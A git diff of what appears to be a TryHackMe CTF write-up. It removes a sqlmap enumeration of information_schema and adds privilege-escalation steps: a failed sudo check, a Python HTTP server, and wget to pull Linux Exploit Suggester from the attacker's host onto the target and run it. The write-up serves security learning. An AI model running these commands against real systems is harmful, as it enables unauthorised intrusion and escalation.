@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/bibloteca/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-24T11:00:25.212+02:00","updated":"2026-04-26T11:31:43.947+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/bibloteca/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"],"created":"2026-04-24T11:00:25.212+02:00","updated":"2026-04-26T12:07:48.473+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup"]}}
 ---
 
 ![](/img/user/Attachments/redteaming2.png)
@@ -92,101 +92,9 @@ password: My_P@ssW0rd123
 
 The credentials work but no flag is seen on smokey's dashboard. 
 
-> Moving to Post Exploitation
 
 ----
 ## Post-exploitation
-
-```bash
-sqlmap --batch -r login.req --level=5 -D information_schema --tables
-```
-
-Let's have a look at the `information_schema`. 
-
-```
-ADMINISTRABLE_ROLE_AUTHORIZATIONS     |  
-| APPLICABLE_ROLES                      |  
-| CHARACTER_SETS                        |  
-| CHECK_CONSTRAINTS                     |  
-| COLLATIONS                            |  
-| COLLATION_CHARACTER_SET_APPLICABILITY |  
-| COLUMNS_EXTENSIONS                    |  
-| COLUMN_PRIVILEGES                     |  
-| COLUMN_STATISTICS                     |  
-| ENABLED_ROLES                         |  
-| FILES                                 |  
-| INNODB_BUFFER_PAGE                    |  
-| INNODB_BUFFER_PAGE_LRU                |  
-| INNODB_BUFFER_POOL_STATS              |  
-| INNODB_CACHED_INDEXES                 |  
-| INNODB_CMP                            |  
-| INNODB_CMPMEM                         |  
-| INNODB_CMPMEM_RESET                   |  
-| INNODB_CMP_PER_INDEX                  |  
-| INNODB_CMP_PER_INDEX_RESET            |  
-| INNODB_CMP_RESET                      |  
-| INNODB_COLUMNS                        |  
-| INNODB_DATAFILES                      |  
-| INNODB_FIELDS                         |  
-| INNODB_FOREIGN                        |  
-| INNODB_FOREIGN_COLS                   |  
-| INNODB_FT_BEING_DELETED               |  
-| INNODB_FT_CONFIG                      |  
-| INNODB_FT_DEFAULT_STOPWORD            |  
-| INNODB_FT_DELETED                     |  
-| INNODB_FT_INDEX_CACHE                 |  
-| INNODB_FT_INDEX_TABLE                 |  
-| INNODB_INDEXES                        |  
-| INNODB_METRICS                        |  
-| INNODB_SESSION_TEMP_TABLESPACES       |  
-| INNODB_TABLES                         |  
-| INNODB_TABLESPACES                    |  
-| INNODB_TABLESPACES_BRIEF              |  
-| INNODB_TABLESTATS                     |  
-| INNODB_TEMP_TABLE_INFO                |  
-| INNODB_TRX                            |  
-| INNODB_VIRTUAL                        |  
-| KEYWORDS                              |  
-| KEY_COLUMN_USAGE                      |  
-| OPTIMIZER_TRACE                       |  
-| PARAMETERS                            |  
-| PROFILING                             |  
-| REFERENTIAL_CONSTRAINTS               |  
-| RESOURCE_GROUPS                       |  
-| ROLE_COLUMN_GRANTS                    |  
-| ROLE_ROUTINE_GRANTS                   |  
-| ROLE_TABLE_GRANTS                     |  
-| ROUTINES                              |  
-| SCHEMATA                              |  
-| SCHEMATA_EXTENSIONS                   |  
-| SCHEMA_PRIVILEGES                     |  
-| STATISTICS                            |  
-| ST_GEOMETRY_COLUMNS                   |  
-| ST_SPATIAL_REFERENCE_SYSTEMS          |  
-| ST_UNITS_OF_MEASURE                   |  
-| TABLESPACES                           |  
-| TABLESPACES_EXTENSIONS                |  
-| TABLES_EXTENSIONS                     |  
-| TABLE_CONSTRAINTS                     |  
-| TABLE_CONSTRAINTS_EXTENSIONS          |  
-| TABLE_PRIVILEGES                      |  
-| USER_ATTRIBUTES                       |  
-| USER_PRIVILEGES                       |  
-| VIEWS                                 |  
-| VIEW_ROUTINE_USAGE                    |  
-| VIEW_TABLE_USAGE                      |  
-| COLUMNS                               |  
-| ENGINES                               |  
-| EVENTS                                |  
-| PARTITIONS                            |  
-| PLUGINS                               |  
-| PROCESSLIST                           |  
-| TABLES                                |  
-| TRIGGERS                              |  
-+---------------------------------------+
-```
-
-Dumping the tables in the information_schema can potentially reveal valuable information. Realizing I havent tried the credentials for SSH yet im going to do that before further enumerating the information_schema.
 
 ### SSH 
 
@@ -207,6 +115,60 @@ So, there are other users on the system. **hazel**. Let's see if its possible to
 
 
 So, **root** can read/write these files. and **hazel** can read both files. For everyone else its **permission denied**. Sadly. Time for some linux priv escalation classics.
+
+```bash
+smokey@ip-10-114-167-160:/home/hazel$ sudo -l  
+[sudo] password for smokey:  
+Sorry, user smokey may not run sudo on ip-10-114-167-160.
+```
+
+Sadly, smokey's permissions are limited. Checking for cronjobs there are sadly no jobs running on a schedule so nothing to exploit there. Maybe it's time for some automation scripts. 
+
+### Moving to LES 
+
+Let's use Linux Exploit Suggester.
+
+**Downloading les.sh to target machine**
+```bash
+
+# Copy les.sh to current directory
+cp /opt/les.sh . 
+
+# start python http server 
+python -m http.server 8000
+
+# in smokey's directory, download it to target machine
+wget http://IP:8000/les.sh
+
+# make it executable
+chmod +x 
+
+# run it 
+./les.sh
+
+```
+
+![](/img/user/Attachments/les.png)
+
+Running **les** gives numerous possible exploits. 
+
+```bash
+
+# Checking kernel info and ubuntu release version
+uname -a 
+```
+
+```bash
+Linux ip-10-114-167-160 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+Let's have a look at the ubuntu version running on the target and the kernel. So the kernel version is **5.15.0-138-generic** and the ubuntu release is **20.04.1**
+
+
+
+
+
+
 
 
 
